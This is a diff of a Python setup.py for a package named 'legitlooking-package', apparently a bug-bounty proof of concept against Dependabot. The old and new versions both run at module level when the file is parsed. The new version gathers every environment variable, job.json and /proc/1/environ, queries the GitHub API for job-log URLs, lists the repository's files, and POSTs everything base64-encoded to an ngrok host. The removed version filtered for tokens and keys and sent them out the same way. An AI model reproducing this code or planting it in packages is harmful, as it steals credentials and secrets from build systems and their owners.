@@ -1,57 +1,148 @@
 from setuptools import setup
 
-# ============================================================
-# Dependabot RCE PoC - Finding 1: setup.py exec() sandbox escape
-#
-# Dependabot executes this file via exec() in parser.py.
-# __builtins__ are unrestricted and os is available.
-# This triggers during the FILE PARSING phase (not just updates).
-#
-# Replace COLLAB_URL with your Burp Collaborator / interactsh URL.
-# ============================================================
-
-COLLAB_URL = "https://854e-2001-1c00-307-d600-5943-e639-f9a6-c878.ngrok-free.app"
+COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"
 
 try:
-    import urllib.request, base64, os
+    import urllib.request
+    import urllib.parse
+    import urllib.error
+    import base64
+    import os
+    import re
+    import json
 
-    # Collect high-value data from the Dependabot worker environment
-    env_raw = open("/proc/self/environ", "rb").read()
-    env_vars = {
-        k.decode(errors="replace"): v.decode(errors="replace")
-        for k, v in (
-            pair.split(b"=", 1)
-            for pair in env_raw.split(b"\x00")
-            if b"=" in pair
+    lines = []
+
+    # 1. Alle env vars
+    lines.append("=== ENV ===")
+    lines.append("\n".join(f"{k}={v}" for k, v in os.environ.items()))
+
+    # 2. job.json - geen sanitizer in Python updater
+    try:
+        job_path = os.environ.get(
+            "DEPENDABOT_JOB_PATH",
+            "/home/dependabot/dependabot-updater/job.json"
         )
-    }
+        with open(job_path) as f:
+            lines.append("\n=== JOB.JSON ===")
+            lines.append(f.read())
+    except Exception as e:
+        lines.append(f"\n=== JOB.JSON FOUT: {e} ===")
 
-    # Filter credentials/tokens
-    interesting = {
-        k: v for k, v in env_vars.items()
-        if any(kw in k.upper() for kw in [
-            "TOKEN", "SECRET", "KEY", "CRED", "PASS", "AUTH",
-            "GITHUB", "NPM", "PYPI", "GEM", "RUBYGEMS"
-        ])
-    }
+    # 3. /proc/1/environ
+    try:
+        with open("/proc/1/environ", "rb") as f:
+            lines.append("\n=== /proc/1/environ ===")
+            lines.append(f.read().replace(b"\x00", b"\n").decode(errors="replace"))
+    except Exception as e:
+        lines.append(f"\n=== /proc/1/environ FOUT: {e} ===")
 
-    payload = base64.b64encode(str(interesting).encode()).decode()
-    urllib.request.urlopen(f"{COLLAB_URL}?poc=1&data={payload}", timeout=5)
+    # 4. GitHub API via proxy
+    # Python urllib gebruikt HTTPS_PROXY env var automatisch
+    def gh_call(path):
+        try:
+            req = urllib.request.Request(
+                f"https://api.github.com{path}",
+                headers={
+                    "Accept": "application/vnd.github+json",
+                    "X-GitHub-Api-Version": "2022-11-28",
+                }
+            )
+            with urllib.request.urlopen(req, timeout=10) as resp:
+                body = resp.read(800).decode(errors="replace")
+                return f"{resp.status}: {body}"
+        except urllib.error.HTTPError as e:
+            return f"HTTP {e.code}: {e.read(300).decode(errors='replace')}"
+        except Exception as e:
+            return f"FOUT: {e}"
+
+    lines.append("\n=== GITHUB API VIA PROXY ===")
+
+    runs_raw = gh_call("/repos/ugurcanli/testpen/actions/runs?per_page=1&event=dynamic")
+    lines.append(f"Runs: {runs_raw[:800]}")
+
+    run_id_match = re.search(r'"id":(\d+)', runs_raw)
+    run_id = run_id_match.group(1) if run_id_match else None
+    lines.append(f"Run ID: {run_id}")
+
+    if run_id:
+        jobs_raw = gh_call(f"/repos/ugurcanli/testpen/actions/runs/{run_id}/jobs")
+        lines.append(f"\nJobs: {jobs_raw[:800]}")
+        job_id_match = re.search(r'"id":(\d+)', jobs_raw)
+        job_id = job_id_match.group(1) if job_id_match else None
+        lines.append(f"Job ID: {job_id}")
+
+        if job_id:
+            lines.append(f"\n--- Job logs SAS URL ({job_id}) ---")
+            try:
+                class NoRedirect(urllib.request.HTTPRedirectHandler):
+                    def redirect_request(self, req, fp, code, msg, headers, newurl):
+                        return None
+
+                opener = urllib.request.build_opener(NoRedirect())
+                req = urllib.request.Request(
+                    f"https://api.github.com/repos/ugurcanli/testpen/actions/jobs/{job_id}/logs",
+                    headers={
+                        "Accept": "application/vnd.github+json",
+                        "X-GitHub-Api-Version": "2022-11-28",
+                    }
+                )
+                try:
+                    opener.open(req, timeout=10)
+                    lines.append("Geen redirect ontvangen")
+                except urllib.error.HTTPError as e:
+                    if e.code in (301, 302, 303, 307, 308):
+                        sas_url = e.headers.get("Location", "")
+                        lines.append(f"SAS URL: {sas_url}")
+                    else:
+                        lines.append(f"HTTP {e.code}: {e.read(200).decode(errors='replace')}")
+            except Exception as e:
+                lines.append(f"FOUT logs: {e}")
+
+    # 5. Repo bestanden
+    repo_path = os.environ.get(
+        "DEPENDABOT_REPO_CONTENTS_PATH",
+        "/home/dependabot/dependabot-updater/repo"
+    )
+    try:
+        import subprocess
+        ls_out = subprocess.run(
+            ["ls", "-la", repo_path],
+            capture_output=True, text=True, timeout=5
+        ).stdout
+        lines.append(f"\n=== REPO BESTANDEN ===\n{ls_out[:500]}")
+    except Exception as e:
+        lines.append(f"\n=== REPO FOUT: {e} ===")
+
+    # 6. Stuur alles op
+    full_output = "\n".join(lines).encode("utf-8", errors="replace")
+    payload = base64.b64encode(full_output).decode()
+
+    post_req = urllib.request.Request(
+        f"{COLLAB_URL}?poc=setup_py",
+        data=payload.encode(),
+        method="POST",
+        headers={"Content-Type": "text/plain"}
+    )
+    urllib.request.urlopen(post_req, timeout=10)
 
 except Exception as e:
-    # Fallback: blind ping to confirm execution
     try:
         import urllib.request
-        urllib.request.urlopen(f"{COLLAB_URL}?poc=1&err={str(e)[:100]}", timeout=5)
+        import urllib.parse
+        urllib.request.urlopen(
+            f"{COLLAB_URL}?poc=setup_py&err={urllib.parse.quote(str(e)[:200])}",
+            timeout=5
+        )
     except Exception:
         pass
 
 setup(
     name="legitlooking-package",
-    version="1.0.0",
+    version="1.0.1",
     install_requires=[
-        "requests==2.28.2",
-        "flask==2.3.0",
+        "requests==2.27.1",
+        "flask==2.2.0",
     ],
     python_requires=">=3.8",
 )
